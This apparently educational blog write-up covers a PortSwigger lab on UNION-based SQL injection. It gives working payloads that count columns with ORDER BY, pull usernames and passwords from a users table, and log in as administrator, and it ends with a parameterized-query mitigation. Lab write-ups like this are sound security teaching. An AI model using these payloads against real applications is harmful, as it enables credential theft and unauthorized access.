---
layout: post
title: "PortSwigger: SQL Injection — UNION Attack, Retrieving Data from Other Tables"
date: 2026-02-24
categories: [portswigger, writeup]
tags: [web, sqli, union-based, portswigger, database]
platform: "PortSwigger"
difficulty: "Medium"
---

**Lab:** SQL injection UNION attack, retrieving data from other tables | **Platform:** PortSwigger Web Security Academy | **Difficulty:** Practitioner

This lab contains a SQL injection vulnerability in the product category filter. The database contains a `users` table with columns `username` and `password`. The goal is to perform a UNION-based SQLi attack to retrieve the credentials and log in as `administrator`.

## Enumeration

### Identifying the Injection Point

The vulnerable parameter is the `category` filter in the GET request:

```
GET /filter?category=Gifts HTTP/1.1
```

Testing with a single quote to confirm the injection:

```
GET /filter?category=Gifts' HTTP/1.1
```

The application returns a 500 error — the query is being broken. We have SQLi.

### Determining Number of Columns

Use `ORDER BY` to determine the number of columns in the original query:

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--   <- 500 error
```

The query has **2 columns**.

### Checking Column Data Types

We need to find which columns accept string data for our UNION payload:

```sql
' UNION SELECT 'a','b'--
```

Both columns accept strings — confirmed.

---

## Exploitation

### UNION-Based Data Extraction

Now we retrieve the `users` table. The payload:

```sql
' UNION SELECT username,password FROM users--
```

Full URL-encoded request:

```
GET /filter?category=Gifts'+UNION+SELECT+username,password+FROM+users-- HTTP/1.1
```

The response includes the injected rows alongside the normal product data:

```
administrator | s3cure_p4ss_h3r3
wiener        | peter
carlos        | montoya
```

### Logging In

Using the extracted credentials, we log into the application:

```
Username: administrator
Password: s3cure_p4ss_h3r3
```

**Lab solved! ✓**

---

## Behind the Scenes — What Happened?

The original query likely looked like this:

```sql
SELECT name, description FROM products WHERE category = 'Gifts'
```

Our injected UNION appended a second SELECT:

```sql
SELECT name, description FROM products WHERE category = 'Gifts'
UNION SELECT username, password FROM users--'
```

The `--` comments out the rest of the original query. The UNION combines the results from both SELECTs into a single result set, which the application renders in the response.

---

## Key Conditions for UNION Attacks

| Condition | Requirement |
|-----------|-------------|
| Column count | Both SELECT statements must return the same number of columns |
| Data types | Column data types must be compatible |
| Null trick | Use `NULL` for columns where type is unknown: `' UNION SELECT NULL,NULL--` |

---

## Mitigation

```python
# VULNERABLE
cursor.execute(f"SELECT * FROM products WHERE category = '{category}'")

# SAFE — use parameterized queries
cursor.execute("SELECT * FROM products WHERE category = %s", (category,))
```

Never concatenate user input into SQL queries. Use prepared statements / parameterized queries in every case.

---

## Lessons Learned

1. **UNION-based SQLi** requires matching column count and compatible data types — enumerate carefully.
2. **ORDER BY** is the cleanest way to determine column count (binary-search approach).
3. Extracting credentials from a `users` table is often the intended path in real-world SQLi scenarios.
4. **Parameterized queries** are the single most effective mitigation against SQL injection.

---

*This writeup documents a PortSwigger Web Security Academy lab for educational purposes.*
